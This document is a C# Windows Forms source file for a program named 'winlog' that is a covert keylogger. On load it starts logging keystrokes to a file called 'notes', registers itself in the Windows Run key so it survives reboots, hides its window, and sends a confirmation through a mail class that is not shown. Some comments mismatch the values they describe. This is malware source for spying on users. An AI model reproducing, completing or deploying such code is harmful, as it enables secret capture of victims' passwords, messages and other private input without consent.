﻿using System.Windows.Forms;
using System.Reflection;
using System;
using System.IO;
using Microsoft.Win32;

namespace winlog
{
    public partial class Form1 : Form
    {
        public static Form1 _Instance;
        private bool allowshowdisplay = false;

        public Form1()
        {
            InitializeComponent();            
            this.Load += Form1_Load1;
            _Instance = this;
        }

        //protected override void SetVisibleCore(bool value)
        //{
        //    base.SetVisibleCore(allowshowdisplay ? value : allowshowdisplay);
        //}

        private void Form1_Load1(object sender, EventArgs e)
        {
            Keylogger();
            SetBoundaries();
            RegisterStartup(true);
            ConfirmStart();
            BeginInvoke(new MethodInvoker(delegate
            {
                Hide();
            }));

        }     

        private void RegisterStartup(bool isChecked)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (isChecked)
            {
                registryKey.SetValue("winlog", Application.ExecutablePath);
            }
            else
            {
                registryKey.DeleteValue("winlog");
            }
        }

        private void SetBoundaries()
        {
            this.StartPosition = FormStartPosition.CenterScreen;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;

            this.MaximumSize = new System.Drawing.Size(800, 470);
            this.MinimumSize = new System.Drawing.Size(800, 470);
            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;

            this.ConsoleBox.MinimumSize = new System.Drawing.Size(760, 395);
            this.ConsoleBox.MinimumSize = new System.Drawing.Size(760, 395);
        }

        public void ConfirmStart()
        {
            string retval = string.Empty;
            Mailer m = new Mailer();
            retval = m.SendConfirmation();

            if (retval != "SUCCESS")
                Print(retval);
        }

        public void Keylogger()
        {
            Assembly asmPath = System.Reflection.Assembly.GetExecutingAssembly();
            string exePath = asmPath.Location.Substring(0, asmPath.Location.LastIndexOf("\\"));

            Keylogger kl = new Keylogger();
            int fInterval = 0;
            string filename = "";
            string mode = "";
            string output = "";
            

            // No args have been given, set defaults.
            if (filename == "")
                filename = "notes";
            if (mode == "")
                mode = "day";
            if (fInterval == 0)
                fInterval = 300000; // Default: 2 Minutes
            if (output == "")
                output = "file";

            kl.LOG_OUT = "file";
            kl.LOG_MODE = "day";
            kl.LOG_FILE = Path.Combine(exePath,filename);
            kl.Enabled = true; // enable key logging
            kl.FlushInterval = 18000000; // 5 hours
        }
    }
}
